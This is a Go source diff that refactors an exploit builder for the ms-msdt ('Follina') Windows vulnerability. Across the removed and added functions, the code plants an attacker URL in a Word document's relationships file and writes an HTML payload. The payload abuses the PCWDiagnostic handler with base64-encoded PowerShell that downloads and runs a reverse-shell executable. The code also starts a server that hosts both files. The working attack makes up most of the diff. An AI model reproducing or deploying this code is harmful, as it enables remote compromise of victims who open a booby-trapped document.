@@ -5,8 +5,8 @@ import (
 	"bytes"
 	"encoding/base64"
 	"flag"
-	"fmt"
 	"io/ioutil"
+	"log"
 	"math/rand"
 	"net/http"
 	"os"
@@ -17,25 +17,9 @@ import (
 func main() {
 	url, port := initArgs()
 	payload_url := "http://" + url + ":" + port
-	produceMaldoc(payload_url)
-	hostDropper(payload_url, port)
-}
-
-func produceMaldoc(payload_url string) {
-	file_byte, _ := os.ReadFile("doc/word/_rels/document.xml.rels")
-	file_byte = bytes.ReplaceAll(file_byte, []byte("{staged_html}"), []byte(payload_url+"/payload.html"))
-	os.WriteFile("doc/word/_rels/document.xml.rels", file_byte, 0644)
-	zipDoc()
-}
-
-func hostDropper(payload_url, port string) {
-	revshell_command := "Invoke-WebRequest " + payload_url + `/poop.exe -OutFile poop.exe; .\poop.exe`
-	base64_revshell_command := base64.StdEncoding.EncodeToString([]byte(revshell_command))
-	html_payload := `<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //`
-	html_payload = strings.ReplaceAll(html_payload, "{base64_payload}", base64_revshell_command)
-	html_payload += generateRandomString(4096) + "\n</script>"
-	os.WriteFile("payload.html", []byte(html_payload), 0644)
-	httpServer(port)
+	createMaliciousDocx(payload_url)
+	createPayload(payload_url, port)
+	hostDropper(port)
 }
 
 func initArgs() (string, string) {
@@ -45,46 +29,50 @@ func initArgs() (string, string) {
 	return *url, *port
 }
 
-func zipDoc() {
-	baseFolder := "doc/"
-	outFile, _ := os.Create(`file.doc`)
-	defer outFile.Close()
-	writer := zip.NewWriter(outFile)
-	addFiles(writer, baseFolder, "")
-	writer.Close()
+func createMaliciousDocx(payload_url string) {
+	file_byte, err := os.ReadFile("template/document.xml.rels.template")
+	handleError("Read document rels", err)
+	file_byte = bytes.ReplaceAll(file_byte, []byte("{staged_html}"), []byte(payload_url+"/payload.html"))
+	err = os.WriteFile("template/doc/word/_rels/document.xml.rels", file_byte, 0644)
+	handleError("Write document rels with payload", err)
+	zipDoc()
+	println("[+] Malicious file created at tmp/file.docx")
 }
 
-func addFiles(w *zip.Writer, basePath, baseInZip string) {
-	// Open the Directory
-	files, err := ioutil.ReadDir(basePath)
-	if err != nil {
-		fmt.Println(err)
-	}
-	for _, file := range files {
-		fmt.Println(basePath + file.Name())
-		if !file.IsDir() {
-			dat, err := ioutil.ReadFile(basePath + file.Name())
-			if err != nil {
-				fmt.Println(err)
-			}
-			// Add some files to the archive.
-			f, err := w.Create(baseInZip + file.Name())
-			if err != nil {
-				fmt.Println(err)
-			}
-			_, err = f.Write(dat)
-			if err != nil {
-				fmt.Println(err)
-			}
-		} else if file.IsDir() {
-			// Recurse
-			newBase := basePath + file.Name() + "/"
-			fmt.Println("Recursing and Adding SubDir: " + file.Name())
-			fmt.Println("Recursing and Adding SubDir: " + newBase)
+func zipDoc() {
+	outFile, err := os.Create(`tmp/file.docx`)
+	handleError("Create malicious doc", err)
+	defer outFile.Close()
+	zipWriter := zip.NewWriter(outFile)
+	addFilesToArchive(zipWriter, "template/doc/", "")
+	defer zipWriter.Close()
+}
 
-			addFiles(w, newBase, baseInZip+file.Name()+"/")
+func addFilesToArchive(zipWriter *zip.Writer, basePath, baseZipPath string) {
+	files, err := ioutil.ReadDir(basePath)
+	handleError("ZIP Reading dir "+basePath, err)
+	for _, file := range files {
+		filePath := basePath + file.Name()
+		if !file.IsDir() {
+			fileByte, err := ioutil.ReadFile(filePath)
+			handleError("ZIP Reading file "+filePath, err)
+			newFile, err := zipWriter.Create(baseZipPath + file.Name())
+			handleError("ZIP Create file "+filePath, err)
+			_, err = newFile.Write(fileByte)
+			handleError("ZIP Write in file "+filePath, err)
+		} else {
+			addFilesToArchive(zipWriter, filePath+"/", baseZipPath+file.Name()+"/")
 		}
 	}
+}
+
+func createPayload(payload_url, port string) {
+	revshell_command := "Invoke-WebRequest " + payload_url + `/poop.exe -OutFile poop.exe; .\poop.exe`
+	base64_revshell_command := base64.StdEncoding.EncodeToString([]byte(revshell_command))
+	html_payload := `<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //` + generateRandomString(4096) + "\n</script>"
+	html_payload = strings.ReplaceAll(html_payload, "{base64_payload}", base64_revshell_command)
+	err := os.WriteFile("tmp/payload.html", []byte(html_payload), 0644)
+	handleError("Write HTML payload", err)
 }
 
 func generateRandomString(length int) string {
@@ -97,12 +85,21 @@ func generateRandomString(length int) string {
 	return string(random_string)
 }
 
-func httpServer(port string) {
-	http.HandleFunc("/payload.html!", func(w http.ResponseWriter, r *http.Request) {
-		http.ServeFile(w, r, "payload.html")
+func hostDropper(port string) {
+	println("[+] Hosting payload on port :" + port)
+	http.HandleFunc("/payload.html", func(w http.ResponseWriter, r *http.Request) {
+		print("a")
+		http.ServeFile(w, r, "tmp/payload.html")
 	})
 	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
-		http.ServeFile(w, r, "Go-RevShell.exe")
+		println("'btdfr")
+		http.ServeFile(w, r, "tmp/Go-RevShell.exe")
 	})
 	http.ListenAndServe(":"+port, nil)
+}
+
+func handleError(reason string, err error) {
+	if err != nil {
+		log.Fatal(reason + " : " + err.Error())
+	}
 }
